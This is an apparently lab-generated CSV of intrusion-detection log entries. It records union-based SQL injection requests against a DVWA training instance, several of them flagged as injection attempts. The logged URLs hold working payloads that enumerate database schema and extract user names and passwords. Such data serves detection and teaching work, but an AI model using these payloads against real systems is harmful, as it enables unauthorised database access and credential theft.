ID_regla,sessionid,repeatcnt,severity_number,Nombre_regla,thread_category,prot,src_ip,dst_ip,log_subtype,extra_data
9999,414330,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+1,version()+#&Submit=Submit"
9999,414611,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,user()+#&Submit=Submit"
9999,414798,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.users#&Submit=Submit"
33338,415474,6,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,database()+#&Submit=Submit"
35823,415474,6,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,database()+#&Submit=Submit"
9999,415474,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,database()+#&Submit=Submit"
9999,415066,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=+3+'+and+1=1+union+select+null,database()+#&Submit=Submit"
30514,414687,5,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.tables+#&Submit=Submit"
58005,414687,5,2,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.tables+#&Submit=Submit"
9999,414687,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.tables+#&Submit=Submit"
14984,414798,5,1,Suspicious HTTP Evasion Found,spyware,tcp,18.218.115.60,172.31.69.28,spyware,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.users#&Submit=Submit"
9999,413704,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.columns+where+table_name='users'+#&Submit=Submit"
9999,414328,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.tables+#&Submit=Submit"
33338,413723,5,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.tables+#&Submit=Submit"
35823,413723,5,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.tables+#&Submit=Submit"
9999,413723,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.tables+#&Submit=Submit"
30514,414182,5,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.columns+where+table_name='ENGINES'+#&Submit=Submit"
58005,414182,5,2,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.columns+where+table_name='ENGINES'+#&Submit=Submit"
9999,414182,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.columns+where+table_name='ENGINES'+#&Submit=Submit"
14984,414067,6,1,Suspicious HTTP Evasion Found,spyware,tcp,18.218.115.60,172.31.69.28,spyware,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.columns+where+table_name='PARTITIONS'+#&Submit=Submit"
9999,414067,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.columns+where+table_name='PARTITIONS'+#&Submit=Submit"
9999,412676,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=0+union+select+null,+concat(first_name,0x0a,password)+from+PARTITIONS#&Submit=Submit"
9999,414647,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=0+union+select+null,+concat(first_name,0x0a,password)+from+events#&Submit=Submit"
9999,414045,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.columns+where+table_name='users'+#&Submit=Submit"
9999,414229,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=0+union+select+null,+concat(first_name,0x0a,password)+from+users+#&Submit=Submit"
33338,414894,4,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.columns+where+table_name='PARTITIONS'+#&Submit=Submit"
35823,414894,4,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.columns+where+table_name='PARTITIONS'+#&Submit=Submit"
30514,412676,3,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=0+union+select+null,+concat(first_name,0x0a,password)+from+PARTITIONS#&Submit=Submit"
58005,412676,3,2,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=0+union+select+null,+concat(first_name,0x0a,password)+from+PARTITIONS#&Submit=Submit"
9999,414894,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.columns+where+table_name='PARTITIONS'+#&Submit=Submit"
14984,414002,1,1,Suspicious HTTP Evasion Found,spyware,tcp,18.218.115.60,172.31.69.28,spyware,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=0+union+select+null,+concat(first_name,0x0a,password)+from+users+#&Submit=Submit"
9999,414002,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=0+union+select+null,+concat(first_name,0x0a,password)+from+users+#&Submit=Submit"
